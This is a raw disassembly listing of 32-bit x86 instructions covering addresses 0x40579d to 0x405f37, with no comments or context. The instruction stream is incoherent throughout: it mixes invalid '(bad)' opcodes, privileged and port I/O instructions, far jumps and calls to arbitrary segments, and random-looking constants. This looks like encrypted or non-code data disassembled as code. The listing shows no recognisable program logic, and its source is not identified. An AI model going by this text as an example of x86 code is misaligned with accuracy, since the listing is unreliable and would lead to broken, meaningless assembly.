  40579d:	adc    cl,BYTE PTR [esi]
  40579f:	jno    0x405760
  4057a1:	xor    al,dh
  4057a3:	push   edi
  4057a4:	dec    eax
  4057a5:	call   0xaf86:0x9222b568
  4057ac:	mov    bh,0xe
  4057ae:	sub    eax,0xf3b5117d
  4057b3:	imul   ebx,DWORD PTR [ecx-0x25e71514],0xffffffab
  4057ba:	dec    ebp
  4057bb:	retf   
  4057bc:	in     al,0xa6
  4057be:	pop    ss
  4057bf:	mov    bl,0x20
  4057c1:	and    al,0x79
  4057c3:	in     al,0xec
  4057c5:	dec    eax
  4057c6:	stc    
  4057c7:	inc    ecx
  4057c8:	mov    esi,0x57594863
  4057cd:	jbe    0x405782
  4057cf:	retf   0xf54b
  4057d2:	cmp    DWORD PTR [ebx+ebp*1-0x4bb8ecda],ebp
  4057d9:	push   es
  4057da:	push   0xffffffc5
  4057dc:	pop    esp
  4057dd:	dec    esi
  4057de:	aam    0xd4
  4057e0:	and    eax,0xbaf881e2
  4057e5:	enter  0x2fbf,0x71
  4057e9:	ja     0x405855
  4057eb:	sbb    al,0x42
  4057ed:	lahf   
  4057ee:	cmp    edi,DWORD PTR [ecx-0x2fbc6544]
  4057f4:	pop    es
  4057f5:	bound  esi,QWORD PTR [edi-0x34e3cfe6]
  4057fb:	sbb    eax,0xe637888a
  405800:	jno    0x405787
  405802:	int    0xce
  405804:	test   BYTE PTR [eax],dl
  405806:	xchg   edi,eax
  405807:	shr    DWORD PTR [ecx+0xf],cl
  40580a:	mov    ebx,0x5fa68243
  40580f:	inc    ecx
  405810:	leave  
  405811:	ins    BYTE PTR es:[edi],dx
  405812:	pop    esi
  405813:	stos   BYTE PTR es:[edi],al
  405814:	inc    edi
  405815:	dec    esi
  405816:	push   esp
  405817:	fst    DWORD PTR [eax]
  405819:	or     bh,ah
  40581b:	jecxz  0x405878
  40581d:	lea    edi,[esi-0x63]
  405820:	sub    DWORD PTR [edx+0x77],edx
  405823:	cmp    edx,ecx
  405825:	cmp    al,0x5
  405827:	imul   ebp,DWORD PTR [ebx+0x5e],0xdfbb0705
  40582e:	hlt    
  40582f:	or     bl,BYTE PTR [ecx+0x26a58d16]
  405835:	adc    BYTE PTR [ecx+0xf],al
  405838:	or     ah,BYTE PTR [ebp-0x1246a1bb]
  40583e:	sbb    al,0xa5
  405840:	mov    ch,0xa0
  405842:	push   0x15
  405844:	mov    ebp,0x663df1b9
  405849:	mov    bl,0x65
  40584b:	sub    al,0xe9
  40584d:	nop
  40584e:	inc    ebp
  40584f:	retf   
  405850:	fwait
  405851:	rdpmc  
  405853:	gs jns 0x405811
  405856:	add    al,0x75
  405858:	sbb    dl,BYTE PTR [ecx]
  40585a:	in     eax,dx
  40585b:	mov    eax,0x11bcc7a
  405860:	dec    esi
  405861:	stos   DWORD PTR es:[edi],eax
  405862:	mov    ch,0xa3
  405864:	mov    al,ds:0xd1cafd74
  405869:	cwde   
  40586a:	daa    
  40586b:	jno    0x405893
  40586d:	add    esi,edx
  40586f:	xchg   ebx,eax
  405870:	jp     0x405893
  405872:	push   es
  405873:	cmp    DWORD PTR [ebp+0x2314fe21],edx
  405879:	out    dx,eax
  40587a:	xchg   edx,eax
  40587b:	jle    0x405839
  40587d:	pop    esi
  40587e:	add    eax,0xadf538b2
  405883:	mov    bl,0xe2
  405885:	pop    ss
  405886:	add    edx,DWORD PTR [esi-0x772d8192]
  40588c:	lea    eax,ds:0x48166fb1
  405892:	dec    dx
  405894:	xor    ecx,DWORD PTR [ebx+0x3caa65bf]
  40589a:	push   ebx
  40589b:	jnp    0x4058fa
  40589d:	ins    DWORD PTR es:[edi],dx
  40589e:	daa    
  40589f:	mov    al,0xb8
  4058a1:	dec    ecx
  4058a2:	les    esi,FWORD PTR [edx]
  4058a4:	cwde   
  4058a5:	mov    ecx,?
  4058a7:	and    BYTE PTR [edx+0x36094d0e],al
  4058ad:	imul   esi,DWORD PTR [eax-0x58],0x63
  4058b1:	xchg   ebx,eax
  4058b2:	add    BYTE PTR [ebx+0x30],dh
  4058b5:	call   0x2675e741
  4058ba:	fdiv   DWORD PTR [ebx-0x747fa90d]
  4058c0:	xor    BYTE PTR [esi+0x5196ee52],0x6f
  4058c7:	into   
  4058c8:	fwait
  4058c9:	pop    edi
  4058ca:	push   ss
  4058cb:	jmp    0x668b:0xec9cf9ee
  4058d2:	mov    ebx,0xec5b40d0
  4058d7:	in     al,0x2c
  4058d9:	into   
  4058da:	dec    esi
  4058db:	(bad)  [edi-0x71]
  4058de:	jp     0x40588f
  4058e0:	add    bh,0xa3
  4058e3:	sub    al,0x9d
  4058e5:	xor    al,0xf
  4058e7:	daa    
  4058e8:	js     0x405958
  4058ea:	jp     0x405932
  4058ec:	mov    esi,DWORD PTR [edx]
  4058ee:	pop    eax
  4058ef:	inc    eax
  4058f0:	lods   eax,DWORD PTR ds:[esi]
  4058f1:	xor    BYTE PTR [esi+ebp*1-0x692583f],dl
  4058f8:	mov    dh,0xe9
  4058fa:	and    cl,BYTE PTR [edi+esi*1]
  4058fd:	loop   0x4058a9
  4058ff:	sub    al,0xea
  405901:	icebp  
  405902:	pop    edx
  405903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405904:	aaa    
  405905:	mov    ch,dl
  405907:	sti    
  405908:	pop    eax
  405909:	lahf   
  40590a:	imul   BYTE PTR [edi]
  40590c:	sub    eax,0x13fd0b8e
  405911:	test   DWORD PTR [ebp-0x61],0xdedc27f5
  405918:	inc    edi
  405919:	loop   0x40595b
  40591b:	and    BYTE PTR [ecx+0x8],0xa
  40591f:	arpl   WORD PTR [ebp+0x4c0c6650],si
  405925:	xchg   ebp,eax
  405926:	jo     0x405946
  405928:	mov    dl,BYTE PTR [ebp+ebp*4+0x7bb428ee]
  40592f:	and    BYTE PTR [esi],bh
  405931:	sbb    ah,bh
  405933:	adc    bh,BYTE PTR es:[edx-0x381e5e6f]
  40593a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40593b:	sbb    cl,BYTE PTR [edx+0x56916fbe]
  405941:	cmc    
  405942:	inc    ecx
  405943:	mov    al,0xc9
  405945:	sahf   
  405946:	leave  
  405947:	fwait
  405948:	ror    BYTE PTR [ecx-0x4cef2d7a],0x3a
  40594f:	inc    esp
  405950:	mov    eax,0x5841e610
  405955:	and    DWORD PTR [eax+0x5b3a9231],0xffffff83
  40595c:	repz add ah,BYTE PTR [ecx+0x51229e5]
  405963:	jne    0x405941
  405965:	inc    eax
  405966:	sahf   
  405967:	jo     0x40599d
  405969:	(bad)  
  40596a:	arpl   WORD PTR [ebp-0x62],ax
  40596d:	pushf  
  40596e:	in     eax,0xe2
  405970:	popf   
  405971:	and    BYTE PTR [eax-0x6e868e01],0xb
  405978:	jg     0x4059cd
  40597a:	cmp    DWORD PTR [eax+ebx*2+0x67a16257],ecx
  405981:	pop    es
  405982:	cld    
  405983:	fiadd  WORD PTR [ebx]
  405985:	xchg   ebx,eax
  405986:	stos   BYTE PTR es:[edi],al
  405987:	jbe    0x4059e7
  405989:	call   0x6465:0x15f6ebcf
  405990:	(bad)  
  405991:	cmp    ebx,esi
  405993:	loopne 0x405973
  405995:	rcl    BYTE PTR [ebp+0x452b675e],1
  40599b:	sub    DWORD PTR [edx-0x1824bdbf],0x62f5b2df
  4059a5:	jmp    0x5785:0xfd8a7d15
  4059ac:	imul   ah
  4059ae:	dec    edi
  4059af:	sub    BYTE PTR [ecx+0x6e889c00],cl
  4059b5:	retf   0x1120
  4059b8:	das    
  4059b9:	fsub   QWORD PTR [eax]
  4059bb:	ja     0x405a32
  4059bd:	(bad)  
  4059be:	or     BYTE PTR ds:0xe0e350ee,ah
  4059c4:	(bad)  
  4059c5:	(bad)  
  4059c6:	arpl   WORD PTR [edi+0x2aab675e],si
  4059cc:	aas    
  4059cd:	das    
  4059ce:	dec    edx
  4059cf:	sub    bh,BYTE PTR [edx+0x4e]
  4059d2:	pop    es
  4059d3:	xlat   BYTE PTR ds:[ebx]
  4059d4:	ret    0xe366
  4059d7:	(bad)  gs:[edi]
  4059da:	imul   DWORD PTR [edx*4+0x5d63d5a1]
  4059e1:	pop    eax
  4059e2:	xchg   BYTE PTR [ebp+0x2e98115b],bh
  4059e8:	int    0x30
  4059ea:	outs   dx,BYTE PTR ds:[esi]
  4059eb:	popf   
  4059ec:	mov    ch,0xaf
  4059ee:	xchg   ecx,eax
  4059ef:	and    esp,ebp
  4059f1:	ins    DWORD PTR es:[edi],dx
  4059f2:	jp     0x405a35
  4059f4:	push   esi
  4059f5:	xor    BYTE PTR [ecx+0x27],al
  4059f8:	pop    eax
  4059f9:	stos   DWORD PTR es:[edi],eax
  4059fa:	hlt    
  4059fb:	pop    eax
  4059fc:	out    0x21,eax
  4059fe:	dec    eax
  4059ff:	sub    ch,BYTE PTR [edi-0x47]
  405a02:	jmp    0x405a39
  405a04:	sub    dl,bl
  405a06:	into   
  405a07:	es xor al,0xd8
  405a0a:	push   ebx
  405a0b:	mov    edi,ss
  405a0d:	sbb    BYTE PTR [esi+0x23],bh
  405a10:	in     eax,dx
  405a11:	repnz or eax,0x57474d2e
  405a17:	or     edi,DWORD PTR [ecx+0x7bed6dd1]
  405a1d:	(bad)  
  405a1e:	pop    esi
  405a1f:	xor    eax,0x6c3aa127
  405a24:	push   ecx
  405a25:	sbb    eax,0xbb4673c5
  405a2a:	push   edx
  405a2b:	ret    0xd67f
  405a2e:	add    bh,bl
  405a30:	add    BYTE PTR [ebp+edx*2+0x661017d2],cl
  405a37:	int3   
  405a38:	stos   DWORD PTR es:[edi],eax
  405a39:	aad    0xe9
  405a3b:	add    al,0x79
  405a3d:	xchg   ecx,eax
  405a3e:	test   eax,0x50ba7b66
  405a43:	and    DWORD PTR [edx],ecx
  405a45:	(bad)  
  405a46:	bnd js 0x4059ca
  405a49:	push   cs
  405a4a:	inc    edx
  405a4b:	inc    ebp
  405a4c:	push   ebp
  405a4d:	pop    es
  405a4e:	and    ch,0x22
  405a51:	and    edx,ebp
  405a53:	xchg   edx,eax
  405a54:	out    dx,eax
  405a55:	fs and al,0x9f
  405a58:	ins    DWORD PTR es:[edi],dx
  405a59:	sbb    al,0xf1
  405a5b:	and    BYTE PTR [edi-0x27],ch
  405a5e:	mov    esp,0x8ec87f5a
  405a63:	and    ecx,ebp
  405a65:	call   DWORD PTR [eax-0x2efa1f23]
  405a6b:	or     BYTE PTR [ebx+0x4e],0xe1
  405a6f:	repz je 0x405a69
  405a72:	lds    edx,FWORD PTR [ecx]
  405a74:	rcr    BYTE PTR [ecx+0x44],0xd1
  405a78:	fnstcw WORD PTR [esi-0x18]
  405a7b:	xlat   BYTE PTR ds:[ebx]
  405a7c:	gs dec eax
  405a7e:	mov    dl,0xc
  405a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a81:	test   eax,0x841d15f5
  405a86:	xor    bl,al
  405a88:	xchg   esp,eax
  405a89:	jp     0x405aea
  405a8b:	mov    al,0xb8
  405a8d:	sub    dl,0x8f
  405a90:	inc    ebp
  405a91:	loope  0x405abb
  405a93:	ds jl  0x405a4c
  405a96:	int    0x7a
  405a98:	pop    ss
  405a99:	jecxz  0x405a8b
  405a9b:	data16 fs cli 
  405a9e:	push   eax
  405a9f:	stos   DWORD PTR es:[edi],eax
  405aa0:	icebp  
  405aa1:	int3   
  405aa2:	lods   al,BYTE PTR ds:[esi]
  405aa3:	xor    esp,0x99ea7920
  405aa9:	imul   esp,eax,0xffffffc8
  405aac:	push   esi
  405aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aae:	xchg   BYTE PTR [edx+edx*4],bl
  405ab1:	test   al,0x34
  405ab3:	je     0x405a48
  405ab5:	pop    ss
  405ab6:	sti    
  405ab7:	test   ecx,esi
  405ab9:	mov    ds,WORD PTR [ecx+0x2351c386]
  405abf:	pop    es
  405ac0:	jnp    0x405ab8
  405ac2:	pop    esp
  405ac3:	dec    esp
  405ac4:	cmc    
  405ac5:	mov    ebp,0x1f8ce3fd
  405aca:	mov    ah,0x39
  405acc:	idiv   DWORD PTR [edx+0x33]
  405acf:	addr16 fninit 
  405ad2:	mov    al,ds:0x7cb7405a
  405ad7:	add    ebp,DWORD PTR [edx+0x2b]
  405ada:	daa    
  405adb:	outs   dx,BYTE PTR ds:[esi]
  405adc:	push   edi
  405add:	cwde   
  405ade:	imul   edx,ecx,0x5f
  405ae1:	das    
  405ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ae3:	xchg   BYTE PTR [edx],bh
  405ae5:	in     al,dx
  405ae6:	cmp    al,0xf2
  405ae8:	out    dx,eax
  405ae9:	fcom   st(4)
  405aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aec:	lods   al,BYTE PTR ds:[esi]
  405aed:	mov    dh,0x80
  405aef:	in     eax,dx
  405af0:	push   cs
  405af1:	jbe    0x405a77
  405af3:	ficom  WORD PTR [edx]
  405af5:	mov    esi,0xdfc914b
  405afa:	(bad)  
  405afb:	popa   
  405afc:	sbb    esi,edi
  405afe:	data16 fs ja 0x405b56
  405b02:	xchg   BYTE PTR [eax+edi*8-0x61e5e1c7],bl
  405b09:	jle    0x405a99
  405b0b:	xchg   esi,eax
  405b0c:	les    edi,FWORD PTR [edx-0x44b64fe8]
  405b12:	dec    ebp
  405b13:	inc    edx
  405b14:	sub    BYTE PTR [edx],bh
  405b16:	jb     0x405b8a
  405b18:	or     DWORD PTR [edi+0x72],eax
  405b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b1c:	jp     0x405ad2
  405b1e:	in     eax,dx
  405b1f:	xchg   ebx,eax
  405b20:	nop
  405b21:	nop
  405b22:	mov    WORD PTR [edx],es
  405b24:	mov    esp,0x7af0b6e5
  405b29:	sub    ebp,esi
  405b2b:	ds js  0x405b4c
  405b2e:	mov    WORD PTR [edi-0x1b],ss
  405b31:	imul   edi,DWORD PTR [edi+0x2a],0xffffff9c
  405b35:	nop    DWORD PTR [edi+0x7a444956]
  405b3c:	sub    DWORD PTR [esp+ebp*8],edi
  405b3f:	dec    DWORD PTR [esi+0x2207c05]
  405b45:	fild   WORD PTR [eax-0x74]
  405b48:	push   ss
  405b49:	int    0xad
  405b4b:	cli    
  405b4c:	in     al,dx
  405b4d:	sub    esi,edi
  405b4f:	aas    
  405b50:	imul   BYTE PTR [esi+edi*4-0x6d]
  405b54:	in     eax,0xf9
  405b56:	cdq    
  405b57:	dec    esi
  405b58:	pop    ecx
  405b59:	pop    es
  405b5a:	icebp  
  405b5b:	imul   esi
  405b5d:	pop    es
  405b5e:	popa   
  405b5f:	mov    ebp,0xb78f8ee6
  405b64:	mov    DWORD PTR [ebx],0xfcf9cc84
  405b6a:	lock sub edi,DWORD PTR [edx+0x5c]
  405b6e:	aad    0x53
  405b70:	xchg   ebx,eax
  405b71:	or     BYTE PTR [edi],ah
  405b73:	inc    edx
  405b74:	xor    BYTE PTR [edi],al
  405b76:	sbb    esp,ecx
  405b78:	mov    edx,0x4c717ff4
  405b7d:	push   edx
  405b7e:	scas   al,BYTE PTR es:[edi]
  405b7f:	add    cl,al
  405b81:	jl     0x405b3a
  405b83:	or     esp,DWORD PTR [ebx-0x6e89408b]
  405b89:	jne    0x405bcb
  405b8b:	and    BYTE PTR [esi],0x29
  405b8e:	xor    ah,dl
  405b90:	pop    esi
  405b91:	mov    dl,bh
  405b93:	push   es
  405b94:	ins    BYTE PTR es:[edi],dx
  405b95:	mov    ds:0x75a5b3a6,al
  405b9a:	cmp    eax,DWORD PTR [eax]
  405b9c:	aas    
  405b9d:	lock pop ebx
  405b9f:	add    BYTE PTR [eax],0x47
  405ba2:	imul   eax,edi,0x7b
  405ba5:	frstor [ebx+0x2d]
  405ba8:	mov    esi,0x7e81611e
  405bad:	push   es
  405bae:	mov    eax,DWORD PTR [eax]
  405bb0:	cs fmulp st(0),st
  405bb3:	leave  
  405bb4:	jmp    0x405ba3
  405bb6:	adc    eax,0xedf90398
  405bbb:	and    DWORD PTR [esi+eax*1],eax
  405bbe:	cwde   
  405bbf:	sbb    ah,dh
  405bc1:	enter  0xfdee,0x27
  405bc5:	lods   al,BYTE PTR ds:[esi]
  405bc6:	loopne 0x405b70
  405bc8:	mov    bh,0x87
  405bca:	pop    ss
  405bcb:	mov    al,ds:0xab4f820a
  405bd0:	sub    dh,dl
  405bd2:	push   0xffffffdd
  405bd4:	adc    edx,esi
  405bd6:	jmp    0xbe97869
  405bdb:	shr    DWORD PTR [eax+0x7301f5a9],0xbf
  405be2:	jg     0x405b67
  405be4:	or     al,BYTE PTR ds:[ebx+0x73157b18]
  405beb:	or     al,0xa2
  405bed:	mov    ah,0xb6
  405bef:	xchg   edi,eax
  405bf0:	sbb    ch,BYTE PTR ss:[ecx+0x5ace886a]
  405bf7:	scas   al,BYTE PTR es:[edi]
  405bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bf9:	mul    DWORD PTR [edi-0x475dfeb7]
  405bff:	and    al,dl
  405c01:	dec    eax
  405c02:	icebp  
  405c03:	sti    
  405c04:	cs stc 
  405c06:	xor    al,0x4c
  405c08:	xchg   ebx,eax
  405c09:	ret    0xed5e
  405c0c:	in     al,0xb4
  405c0e:	imul   esp,DWORD PTR [edi+0x12],0xca9fc737
  405c15:	or     DWORD PTR [edx+0x2a3b6adb],ebp
  405c1b:	xor    BYTE PTR [ebp+0x77abd702],dh
  405c21:	mov    esp,?
  405c23:	cs ds js 0x405be2
  405c27:	in     eax,0x9d
  405c29:	push   cs
  405c2a:	jecxz  0x405bd2
  405c2c:	hlt    
  405c2d:	(bad)  
  405c2e:	imul   DWORD PTR [edi+edi*2]
  405c31:	cdq    
  405c32:	mov    dh,0x3b
  405c34:	sbb    DWORD PTR [ebx+0x6af79121],0xffffff8f
  405c3b:	inc    edi
  405c3c:	in     al,dx
  405c3d:	add    al,BYTE PTR [eax]
  405c3f:	add    eax,esi
  405c41:	xchg   edi,eax
  405c42:	jmp    0x405c90
  405c44:	sti    
  405c45:	dec    ebx
  405c46:	daa    
  405c47:	fstp   TBYTE PTR [ebp+0x1dbacadb]
  405c4d:	and    DWORD PTR [eax],0x71
  405c50:	pop    es
  405c51:	daa    
  405c52:	loope  0x405c46
  405c54:	in     eax,0xb8
  405c56:	mov    eax,ds:0x7a72ca5
  405c5b:	push   eax
  405c5c:	(bad)  
  405c5e:	iret   
  405c5f:	test   BYTE PTR [ebx+0x32cb4b3],bh
  405c65:	out    0x95,al
  405c67:	and    BYTE PTR [esp+edx*4],bh
  405c6a:	sbb    BYTE PTR [edi+0x290ee178],bh
  405c70:	mov    ah,0x42
  405c72:	jmp    0xd0de:0x314652f2
  405c79:	xchg   ebp,eax
  405c7a:	jbe    0x405ca0
  405c7c:	(bad)  
  405c7d:	cmp    DWORD PTR [ecx],esp
  405c7f:	bound  eax,QWORD PTR [ebx]
  405c81:	push   edx
  405c82:	(bad)  
  405c83:	rcr    cl,cl
  405c85:	xchg   edx,eax
  405c86:	xchg   ebp,eax
  405c87:	mov    bh,0x8f
  405c89:	jns    0x405c52
  405c8b:	in     eax,dx
  405c8c:	cmp    DWORD PTR [ecx-0x16],esp
  405c8f:	popf   
  405c90:	inc    esp
  405c91:	test   DWORD PTR [ecx],ecx
  405c93:	xchg   BYTE PTR [edx],cl
  405c95:	xor    DWORD PTR [ebp-0x63],edi
  405c98:	movhps QWORD PTR [edx+0x33],xmm0
  405c9c:	inc    edx
  405c9d:	inc    edi
  405c9e:	mov    BYTE PTR [edi-0x5a],ah
  405ca1:	inc    ebp
  405ca2:	es icebp 
  405ca4:	inc    ebp
  405ca5:	fldenv [ebp+0xd]
  405ca8:	in     al,0xe7
  405caa:	sbb    BYTE PTR [ebp-0x3823dc57],0xf
  405cb1:	mov    ebx,0x3e19e812
  405cb6:	push   ds
  405cb7:	xor    BYTE PTR [ecx-0x9ff424c],ah
  405cbd:	jno    0x405c46
  405cbf:	push   ds
  405cc0:	or     bl,al
  405cc2:	hlt    
  405cc3:	mov    dl,0x44
  405cc5:	adc    BYTE PTR [edx+0x57],dl
  405cc8:	ret    
  405cc9:	or     DWORD PTR [edi],ebx
  405ccb:	(bad)  
  405ccc:	loope  0x405cde
  405cce:	and    al,0xc7
  405cd0:	stos   BYTE PTR es:[edi],al
  405cd1:	arpl   WORD PTR [ebx],sp
  405cd3:	bound  ebx,QWORD PTR ds:0xb0a96dc1
  405cd9:	push   cs
  405cda:	jne    0x405d27
  405cdc:	cs push ds
  405cde:	stos   BYTE PTR es:[edi],al
  405cdf:	inc    ebx
  405ce0:	add    dh,BYTE PTR [edx-0x41a6a24f]
  405ce6:	repnz sbb eax,0xc993bbe7
  405cec:	mov    ch,0x63
  405cee:	adc    al,0x6a
  405cf0:	mov    ds:0x3e8978a,al
  405cf5:	sub    ecx,DWORD PTR [ecx+0x24b2dcbc]
  405cfb:	pop    ecx
  405cfc:	mov    edx,0x91126b7e
  405d01:	jmp    0x48f5dfe7
  405d06:	jbe    0x405d18
  405d08:	sbb    DWORD PTR [ecx+0x48ea8305],edi
  405d0e:	(bad)  
  405d0f:	sbb    DWORD PTR [ebx-0x2008783a],esp
  405d15:	lea    ebx,[ebp+0x4de01079]
  405d1b:	mov    DWORD PTR ds:0x22e3fe9e,edi
  405d21:	mov    ds:0xb76ee789,al
  405d26:	test   DWORD PTR [ecx-0xee5bc40],ebx
  405d2c:	inc    esp
  405d2d:	out    0xff,al
  405d2f:	cmp    ebp,DWORD PTR ds:0x899556e6
  405d35:	popf   
  405d36:	xor    ah,BYTE PTR [ebx+0x2c89a122]
  405d3c:	pop    eax
  405d3d:	test   eax,ebp
  405d3f:	lock in eax,0x75
  405d42:	cs dec esi
  405d44:	mov    dh,0x50
  405d46:	sub    ch,cl
  405d48:	(bad)  [eax+edi*1]
  405d4b:	fisubr DWORD PTR [edx+eiz*2]
  405d4e:	jbe    0x405d8d
  405d50:	or     BYTE PTR [ebp+0xe],dl
  405d53:	mov    eax,ds:0x91e2f2c7
  405d58:	int3   
  405d59:	ret    0x32fc
  405d5c:	cmp    ah,dh
  405d5e:	push   0x15d474cd
  405d63:	push   cs
  405d64:	shl    ebx,cl
  405d66:	sbb    BYTE PTR [ebp+0x5b35dde8],bh
  405d6c:	je     0x405da9
  405d6e:	aad    0x75
  405d70:	push   0xffffffea
  405d72:	adc    al,cl
  405d74:	outs   dx,BYTE PTR ds:[esi]
  405d75:	mov    cl,0x88
  405d77:	es pop esp
  405d79:	adc    eax,0x30ccc16d
  405d7e:	popa   
  405d7f:	loope  0x405de0
  405d81:	data16 stos BYTE PTR es:[edi],al
  405d83:	lds    edi,FWORD PTR [esi]
  405d85:	jmp    0x405d39
  405d87:	xchg   ecx,ebp
  405d89:	xor    ebp,DWORD PTR ds:0x28f0903c
  405d8f:	(bad)  
  405d90:	sar    DWORD PTR [esi],1
  405d92:	sbb    eax,ebx
  405d94:	inc    esp
  405d95:	sub    eax,0x4fd9cc60
  405d9a:	pusha  
  405d9b:	xor    BYTE PTR ds:0xa7c65a61,ch
  405da1:	fcom   st(5)
  405da3:	cmp    DWORD PTR [eax-0x27ef4591],esi
  405da9:	push   es
  405daa:	hlt    
  405dab:	inc    eax
  405dac:	test   edx,edx
  405dae:	add    DWORD PTR [ebx-0x5105c980],edx
  405db4:	dec    ecx
  405db5:	outs   dx,DWORD PTR ds:[esi]
  405db6:	daa    
  405db7:	dec    edx
  405db8:	cmp    ebp,DWORD PTR fs:[edi]
  405dbb:	adc    BYTE PTR [ebp+0x53],bh
  405dbe:	sbb    eax,DWORD PTR [edi-0x79e77667]
  405dc4:	stos   BYTE PTR es:[edi],al
  405dc5:	jno    0x405dc7
  405dc7:	call   0x2d76397f
  405dcc:	daa    
  405dcd:	adc    ebp,DWORD PTR [eax+0x3367f8dc]
  405dd3:	mov    ebx,0x4e8c21be
  405dd8:	ins    DWORD PTR es:[edi],dx
  405dd9:	in     eax,0x48
  405ddb:	pop    ebx
  405ddc:	xchg   DWORD PTR [edx+0x41e194b],ecx
  405de2:	ins    BYTE PTR es:[edi],dx
  405de3:	test   BYTE PTR [edi+0x12],0x6e
  405de7:	iret   
  405de8:	and    cl,0x8d
  405deb:	xchg   esp,eax
  405dec:	je     0x405e6d
  405dee:	test   eax,0x9106d450
  405df3:	mov    esi,0xddd9dab5
  405df8:	fdivr  QWORD PTR [ecx]
  405dfa:	clc    
  405dfb:	inc    edx
  405dfc:	sbb    cl,dl
  405dfe:	mov    fs,WORD PTR [edx-0x45707566]
  405e04:	xchg   esi,eax
  405e05:	pop    es
  405e06:	mov    BYTE PTR [edi],dh
  405e08:	pop    edi
  405e09:	out    0x7f,eax
  405e0b:	push   eax
  405e0c:	push   ecx
  405e0d:	outs   dx,DWORD PTR ds:[esi]
  405e0e:	adc    DWORD PTR [edx],0xffffffcb
  405e11:	mov    ch,0xfb
  405e13:	add    al,0x65
  405e15:	push   0xffffff89
  405e17:	cld    
  405e18:	sti    
  405e19:	outs   dx,DWORD PTR ds:[esi]
  405e1a:	out    0x94,eax
  405e1c:	loopne 0x405df7
  405e1e:	xchg   ecx,eax
  405e1f:	frstor [ebx]
  405e21:	cmp    DWORD PTR [ebx],edi
  405e23:	mov    dl,0x37
  405e25:	sbb    BYTE PTR [esi-0x67ea4eb],ch
  405e2b:	xchg   ebp,eax
  405e2c:	iret   
  405e2d:	jb     0x405e6d
  405e2f:	cwde   
  405e30:	adc    DWORD PTR [edi+0x47],esi
  405e33:	sbb    al,0x8d
  405e35:	enter  0xf96c,0x2b
  405e39:	adc    al,0x96
  405e3b:	das    
  405e3c:	daa    
  405e3d:	(bad)  
  405e3e:	in     eax,dx
  405e3f:	mov    edx,0x1b7c38e4
  405e44:	outs   dx,DWORD PTR ds:[esi]
  405e45:	test   ah,bl
  405e47:	pop    esp
  405e48:	fwait
  405e49:	dec    ebp
  405e4a:	test   al,0xd5
  405e4c:	push   ss
  405e4d:	retf   0xc13b
  405e50:	ret    0x8d7b
  405e53:	cwde   
  405e54:	sbb    ebx,DWORD PTR fs:[ebp+0x7e52bb0]
  405e5b:	jg     0x405e93
  405e5d:	cli    
  405e5e:	or     al,0x42
  405e60:	aaa    
  405e61:	inc    eax
  405e62:	(bad)  
  405e63:	das    
  405e64:	pop    edi
  405e65:	inc    ecx
  405e66:	xor    DWORD PTR [ecx-0x74],0x1d
  405e6a:	popa   
  405e6b:	fs in  eax,0xae
  405e6e:	or     BYTE PTR [edi],bl
  405e70:	sbb    DWORD PTR [ebx],eax
  405e72:	dec    esi
  405e73:	ja     0x405e91
  405e75:	sub    eax,DWORD PTR [eax+0x767d1553]
  405e7b:	imul   esi,DWORD PTR [ebp-0x23f16e4c],0xffffffc5
  405e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e83:	ror    al,cl
  405e85:	shl    ebp,0xb9
  405e88:	dec    esp
  405e89:	add    edx,ebp
  405e8b:	rcl    BYTE PTR [ecx-0x2a],1
  405e8e:	jno    0x405e58
  405e90:	jl     0x405e62
  405e92:	cmp    eax,0x49444356
  405e97:	lahf   
  405e98:	xor    eax,0xb56dd33
  405e9d:	mov    dh,0xd3
  405e9f:	fcomip st,st(4)
  405ea1:	stos   BYTE PTR es:[edi],al
  405ea2:	pop    edx
  405ea3:	int    0xd8
  405ea5:	dec    edi
  405ea6:	imul   ebp,DWORD PTR [ecx+edx*8],0xffffffb5
  405eaa:	add    edi,edi
  405eac:	jecxz  0x405f03
  405eae:	mov    eax,ds:0x7df5e507
  405eb3:	call   0x67fa:0xa1667605
  405eba:	jmp    FWORD PTR ds:0x57ba0f6e
  405ec0:	pop    edx
  405ec1:	push   eax
  405ec2:	jp     0x405f43
  405ec4:	js     0x405e56
  405ec6:	daa    
  405ec7:	ins    DWORD PTR es:[edi],dx
  405ec8:	pushf  
  405ec9:	cmp    DWORD PTR [edx-0x7432b7af],ebx
  405ecf:	or     eax,0xe2a94154
  405ed4:	push   es
  405ed5:	(bad)  
  405ed6:	fdivp  st(1),st
  405ed8:	(bad)  
  405eda:	jnp    0x405ecb
  405edc:	add    bh,BYTE PTR [eax+0x2a]
  405edf:	mov    dl,0xe3
  405ee1:	mov    ebx,0xac783594
  405ee6:	jl     0x405eea
  405ee8:	outs   dx,DWORD PTR ds:[esi]
  405ee9:	outs   dx,DWORD PTR ds:[esi]
  405eea:	in     eax,0x14
  405eec:	mov    al,0x5f
  405eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eef:	lea    eax,[edx+0x50]
  405ef2:	adc    dh,BYTE PTR ds:0x922a06a8
  405ef9:	jle    0x405eb1
  405efb:	xor    ebp,esi
  405efd:	xor    DWORD PTR [eax-0xa],eax
  405f00:	test   esp,ebx
  405f02:	cmp    esi,DWORD PTR [ebx+0x19]
  405f05:	add    DWORD PTR [ebp+0x73962a55],esi
  405f0b:	push   es
  405f0c:	mov    edi,0xd79570cc
  405f12:	aad    0x7b
  405f14:	push   esi
  405f15:	rcl    DWORD PTR [ebx+0x6b7ac5b1],cl
  405f1b:	mov    ch,0xb9
  405f1d:	pop    eax
  405f1e:	sub    al,0x8f
  405f20:	outs   dx,DWORD PTR ds:[esi]
  405f21:	sub    al,0xeb
  405f23:	xchg   ecx,eax
  405f24:	outs   dx,BYTE PTR ds:[esi]
  405f25:	into   
  405f26:	ja     0x405eb8
  405f28:	out    0x35,eax
  405f2a:	xor    al,0x5e
  405f2c:	in     al,0x62
  405f2e:	push   cs
  405f2f:	xchg   ecx,eax
  405f30:	push   eax
  405f31:	ja     0x405ee6
  405f33:	sar    DWORD PTR [ecx],cl
  405f35:	inc    ebx
  405f36:	icebp  
  405f37:	scas   al,BYTE PTR es:[edi]
